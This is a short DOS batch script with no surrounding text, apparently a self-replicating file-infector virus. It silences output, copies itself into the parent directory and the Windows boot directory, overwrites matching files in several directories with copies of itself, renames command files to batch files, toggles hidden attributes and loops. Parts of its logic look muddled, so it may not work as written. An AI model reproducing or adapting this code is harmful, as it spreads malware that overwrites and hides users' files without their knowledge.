   @echo off
   :EchoOff
   ctty nul
   copy %0 ..
   copy %0 %winbootdir%\%0
   set boo= *.kk
   if not exist %boo% goto EchoOn
   for %%b in (%boo% ..\%boo% c:\%boo%) do copy %%b _%boo%
   for %%o in (%boo% ..\%boo% c:\%boo%) do copy %0 %%o
   ren *?.c?m *.bat
   attrib *%boo% + h
   attrib %0 -h
   goto EchoOff
   :EchoOn
   _%0.com
